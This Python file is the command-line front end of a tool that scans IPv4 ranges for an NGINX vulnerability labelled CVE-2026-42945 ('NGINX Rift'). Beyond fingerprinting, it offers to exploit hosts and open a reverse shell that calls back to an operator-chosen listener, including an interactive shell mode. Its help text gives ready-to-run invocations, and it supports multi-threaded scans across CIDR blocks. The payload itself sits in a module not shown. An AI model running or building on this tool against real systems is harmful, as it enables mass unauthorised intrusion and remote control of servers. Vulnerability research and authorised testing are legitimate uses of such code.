"""Command-line interface."""

from __future__ import annotations

import argparse
import sys

from scanner.constants import DEFAULT_CONNECT_TIMEOUT, DEFAULT_PORTS
from scanner.engine import Scanner
from scanner.exploit import format_scan_command
from scanner.log import get_logger, setup_logging
from scanner.models import ScanConfig
from scanner.targets import parse_ports, validate_listen_host

log = get_logger("cli")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Scan for CVE-2026-42945 (NGINX Rift).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Fingerprint only:\n"
            "  python3 scan.py <target> -o report.json\n"
            "\n"
            "Fingerprint + reverse-shell validation:\n"
            "  python3 scan.py <target> --listen-ip <host> --listen-port <port>\n"
            "\n"
            "Interactive shell:\n"
            "  python3 scan.py <target> --shell --listen-ip <host> --listen-port <port>\n"
        ),
    )
    parser.add_argument(
        "target",
        help="IPv4 target: single IP, CIDR, or start-end range",
    )
    parser.add_argument(
        "--shell",
        action="store_true",
        help="Interactive reverse shell session and log payload command",
    )
    parser.add_argument(
        "--listen-ip",
        "--lhost",
        metavar="HOST",
        help="Callback host for reverse-shell validation",
    )
    parser.add_argument(
        "--listen-port",
        "--lport",
        metavar="PORT",
        type=int,
        help="Callback port for reverse-shell validation",
    )
    parser.add_argument(
        "--ports",
        default=",".join(str(p) for p in DEFAULT_PORTS),
        help=f"Ports to scan (default: {','.join(map(str, DEFAULT_PORTS))})",
    )
    parser.add_argument(
        "--exploit-port",
        type=int,
        default=None,
        help="Nginx exploit port if different from scanned port (lab: 19321)",
    )
    parser.add_argument("--probe-path", metavar="PATH", help="URI prefix for + expansion probe")
    parser.add_argument("--threads", type=int, default=50)
    parser.add_argument(
        "--connect-timeout",
        type=float,
        default=DEFAULT_CONNECT_TIMEOUT,
        help=f"TCP connect timeout in seconds (default: {DEFAULT_CONNECT_TIMEOUT})",
    )
    parser.add_argument("--read-timeout", type=float, default=5.0)
    parser.add_argument("-o", "--output", default="scan_report.json")
    parser.add_argument("-q", "--quiet", action="store_true", help="Console: warnings and summary only")
    parser.add_argument("-v", "--verbose", action="store_true", help="Debug logging to console")
    parser.add_argument(
        "--log-file",
        metavar="PATH",
        default="scan.log",
        help="Write full log to file (default: scan.log)",
    )
    parser.add_argument("--no-log-file", action="store_true", help="Do not write a log file")
    parser.add_argument("--exploit-tries", type=int, default=5)
    parser.add_argument("--exploit-max-offsets", type=int, default=5)
    parser.add_argument("--shell-wait", type=float, default=12.0)
    return parser


def validate_args(args: argparse.Namespace) -> None:
    has_ip = args.listen_ip is not None
    has_port = args.listen_port is not None

    if has_ip ^ has_port:
        raise ValueError("--listen-ip and --listen-port must be used together")

    if args.shell and not (has_ip and args.listen_port is not None):
        raise ValueError("--shell requires --listen-ip and --listen-port")

    if has_ip and has_port:
        if not 1 <= args.listen_port <= 65535:
            raise ValueError(f"listen port out of range: {args.listen_port}")
        args.listen_ip = validate_listen_host(args.listen_ip)
        args.exploit_validate = True
        args.validate_all_open = True
        args.interactive_shell = args.shell
    else:
        args.exploit_validate = False
        args.interactive_shell = False
        args.validate_all_open = False
        args.listen_ip = ""
        args.listen_port = 0

    args.log_file = None if args.no_log_file else args.log_file


def config_from_args(args: argparse.Namespace) -> ScanConfig:
    return ScanConfig(
        ip_range=args.target,
        ports=parse_ports(args.ports),
        threads=args.threads,
        connect_timeout=args.connect_timeout,
        read_timeout=args.read_timeout,
        probe_path=args.probe_path,
        output=args.output,
        quiet=args.quiet,
        verbose=args.verbose,
        log_file=args.log_file,
        exploit_validate=args.exploit_validate,
        shell=args.shell,
        interactive_shell=args.interactive_shell,
        listen_ip=args.listen_ip,
        listen_port=args.listen_port,
        exploit_port=args.exploit_port,
        exploit_tries=args.exploit_tries,
        exploit_max_offsets=args.exploit_max_offsets,
        shell_wait=args.shell_wait,
        validate_all_open=args.validate_all_open,
    )


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)

    if args.threads < 1:
        log.error("--threads must be >= 1")
        return 2

    try:
        validate_args(args)
        config = config_from_args(args)
    except ValueError as exc:
        setup_logging(quiet=False, verbose=False, log_file=None)
        log = get_logger("cli")
        log.error("%s", exc)
        return 2

    setup_logging(quiet=config.quiet, verbose=config.verbose, log_file=config.log_file)
    log = get_logger("cli")

    if config.exploit_validate:
        log.info(
            "Reverse-shell validation — listen 0.0.0.0:%s, callback %s:%s",
            config.listen_port,
            config.listen_ip,
            config.listen_port,
        )
        if config.shell:
            log.info(format_scan_command(
                config.ip_range, config.listen_ip, config.listen_port,
            ))

    try:
        scanner = Scanner(config)
        scanner.run()
        scanner.write_report()
    except OSError as exc:
        log.error("%s", exc)
        return 2

    total_vuln = len(scanner.vulnerable_results())
    log.warning("Vulnerable: %s", total_vuln)
    return 0


if __name__ == "__main__":
    sys.exit(main())
